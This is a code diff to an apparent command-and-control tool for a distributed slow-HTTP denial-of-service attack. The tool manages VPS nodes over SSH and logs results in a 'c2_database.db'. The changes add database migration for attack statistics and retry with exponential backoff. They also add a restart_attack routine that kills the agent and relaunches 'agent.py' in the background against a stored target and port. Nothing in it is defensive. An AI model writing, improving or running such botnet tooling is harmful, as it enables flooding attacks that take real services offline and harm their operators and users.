@@ -330,6 +330,7 @@ class DatabaseManager:
         finally:
             if conn:
                 conn.close()
+            self.migrate_database()
     
     def add_vps(self, ip_address, username, encrypted_password, ssh_port=22, location=None, tags=None):
         """Add a new VPS node to the database"""
@@ -564,6 +565,29 @@ class DatabaseManager:
             if conn:
                 conn.close()
     
+    def migrate_database(self):
+        """Tambahkan kolom yang hilang"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Cek kolom bytes_sent
+            cursor.execute("PRAGMA table_info(attack_results)")
+            columns = [col[1] for col in cursor.fetchall()]
+            
+            if 'bytes_sent' not in columns:
+                cursor.execute("ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0")
+                conn.commit()
+                logger.info("Added missing 'bytes_sent' column")
+                
+        except sqlite3.Error as e:
+            logger.error(f"Migration error: {str(e)}")
+        finally:
+            if conn:
+                conn.close()
+
+
     def get_attack_session(self, session_id):
         """Get attack session details by ID"""
         conn = None
@@ -822,54 +846,162 @@ class SSHManager:
                 logger.error(f"Error disconnecting from {ip}: {str(e)}")
         return False
     
-    def execute_command(self, ip, command, timeout=60, auto_reconnect=True):
-        """Execute command with auto-reconnect capability"""
+    def execute_command(self, ip, command, timeout=60, auto_reconnect=True, max_retries=3):
+        """Execute command with enhanced error handling and recovery"""
         
-        # Check if connection exists, try to reconnect if not
-        if ip not in self.connections:
-            if auto_reconnect:
-                logger.info(f"No connection to {ip}, attempting reconnect...")
-                success, message = self.reconnect_vps(ip)
-                if not success:
-                    return False, f"Reconnection failed: {message}"
-            else:
-                return False, "No connection to VPS"
+        retries = 0
+        last_error = None
         
-        try:
-            stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
-            
-            # Wait for command completion
-            exit_status = stdout.channel.recv_exit_status()
-            
-            # Get output
-            output = stdout.read().decode('utf-8', errors='replace')
-            error = stderr.read().decode('utf-8', errors='replace')
-            
-            if exit_status != 0:
-                logger.warning(f"Command on {ip} exited with status {exit_status}: {error}")
-                return False, error or "Command failed with no error message"
-            
-            return True, output
-        except socket.timeout:
-            logger.error(f"Command timed out on {ip}")
-            return False, "Command timed out"
-        except paramiko.SSHException as e:
-            logger.error(f"SSH error on {ip}: {str(e)}")
-            
-            # Try to reconnect if connection was lost
-            if auto_reconnect:
-                logger.info(f"Attempting to reconnect to {ip}...")
-                success, message = self.reconnect_vps(ip)
-                if success:
-                    logger.info(f"Reconnected to {ip}, retrying command...")
-                    return self.execute_command(ip, command, timeout, False)  # Prevent infinite recursion
+        while retries < max_retries:
+            # Check if connection exists
+            if ip not in self.connections:
+                if auto_reconnect:
+                    logger.info(f"No connection to {ip}, attempting reconnect...")
+                    success, message = self.reconnect_vps(ip)
+                    if not success:
+                        last_error = f"Reconnection failed: {message}"
+                        retries += 1
+                        time.sleep(2 ** retries)  # Exponential backoff
+                        continue
                 else:
-                    return False, f"Reconnection failed: {message}"
+                    return False, "No connection to VPS"
             
-            return False, f"SSH error: {str(e)}"
+            try:
+                stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
+                exit_status = stdout.channel.recv_exit_status()
+                output = stdout.read().decode('utf-8', errors='replace')
+                error = stderr.read().decode('utf-8', errors='replace')
+                
+                # Handle specific error cases
+                if exit_status != 0:
+                    # Check for database-related errors
+                    if "no column named bytes_sent" in error or "table attack_results has no column" in error:
+                        logger.error(f"Database schema error on {ip}: {error}")
+                        logger.info("Attempting to fix database schema...")
+                        
+                        # Try to fix database schema
+                        if self._fix_database_schema(ip):
+                            logger.info("Database schema fixed, retrying command...")
+                            retries += 1
+                            continue
+                        else:
+                            logger.error("Failed to fix database schema")
+                    
+                    # Log detailed error
+                    logger.error(f"Command failed on {ip}:")
+                    logger.error(f"Command: {command[:100]}...")  # Log partial command
+                    logger.error(f"Exit status: {exit_status}")
+                    logger.error(f"Error: {error}")
+                    
+                    # Try to restart attack if it's an attack command
+                    if "attack" in command.lower() and auto_reconnect:
+                        logger.info(f"Attempting to restart attack on {ip}")
+                        if self.restart_attack(ip):
+                            logger.info("Attack restarted successfully")
+                            retries += 1
+                            continue
+                    
+                    last_error = error or "Command failed with no error message"
+                    retries += 1
+                    time.sleep(2 ** retries)
+                    continue
+                
+                return True, output
+                
+            except socket.timeout:
+                logger.error(f"Command timed out on {ip}")
+                last_error = "Command timed out"
+                retries += 1
+                time.sleep(2 ** retries)
+                
+            except paramiko.SSHException as e:
+                logger.error(f"SSH error on {ip}: {str(e)}")
+                
+                # Try to reconnect if connection was lost
+                if auto_reconnect:
+                    logger.info(f"Attempting to reconnect to {ip}...")
+                    success, message = self.reconnect_vps(ip)
+                    if success:
+                        logger.info(f"Reconnected to {ip}, retrying command...")
+                        retries += 1
+                        continue
+                    else:
+                        last_error = f"Reconnection failed: {message}"
+                
+                retries += 1
+                time.sleep(2 ** retries)
+                
+            except Exception as e:
+                logger.error(f"Unexpected error executing command on {ip}: {str(e)}")
+                last_error = str(e)
+                retries += 1
+                time.sleep(2 ** retries)
+        
+        return False, f"Command failed after {max_retries} retries. Last error: {last_error}"
+    
+
+    def restart_attack(self, ip):
+        """Restart attack process on VPS"""
+        try:
+            # Kill existing attack process
+            kill_cmd = "pkill -f 'python3 agent.py'"
+            success, output = self.execute_command(ip, kill_cmd, auto_reconnect=False)
+            
+            # Start new attack process
+            if ip in self.connection_cache:
+                cached = self.connection_cache[ip]
+                attack_cmd = f"cd ~/slowhttp_agent && nohup python3 agent.py --target {cached.get('target', '')} --port {cached.get('port', 80)} > /dev/null 2>&1 &"
+                success, output = self.execute_command(ip, attack_cmd, auto_reconnect=False)
+                
+                if success:
+                    logger.info(f"Successfully restarted attack on {ip}")
+                    return True
+                else:
+                    logger.error(f"Failed to restart attack on {ip}: {output}")
+                    return False
+            else:
+                logger.error(f"No cached data for {ip}")
+                return False
+                
         except Exception as e:
-            logger.error(f"Error executing command on {ip}: {str(e)}")
-            return False, str(e)
+            logger.error(f"Failed to restart attack on {ip}: {str(e)}")
+            return False
+    
+    def _fix_database_schema(self, ip):
+        """Attempt to fix database schema on VPS"""
+        try:
+            # Check if database file exists
+            check_db_cmd = "test -f c2_database.db && echo 'exists' || echo 'missing'"
+            success, output = self.execute_command(ip, check_db_cmd, auto_reconnect=False)
+            if not success or "missing" in output:
+                logger.warning("Database file not found on VPS")
+                return False
+            
+            # Get database schema
+            schema_cmd = "sqlite3 c2_database.db \"PRAGMA table_info(attack_results)\""
+            success, output = self.execute_command(ip, schema_cmd, auto_reconnect=False)
+            if not success:
+                logger.error("Failed to get database schema")
+                return False
+            
+            # Check if bytes_sent column exists
+            if "bytes_sent" not in output:
+                # Add missing column
+                alter_cmd = "sqlite3 c2_database.db \"ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0\""
+                success, output = self.execute_command(ip, alter_cmd, auto_reconnect=False)
+                if success:
+                    logger.info("Successfully added bytes_sent column to database")
+                    return True
+                else:
+                    logger.error("Failed to add bytes_sent column")
+                    return False
+            else:
+                logger.info("Database schema already up to date")
+                return True
+                
+        except Exception as e:
+            logger.error(f"Error fixing database schema: {str(e)}")
+            return False
     
     def deploy_agent(self, ip, agent_type="standard"):
         """Deploy attack agent to VPS"""
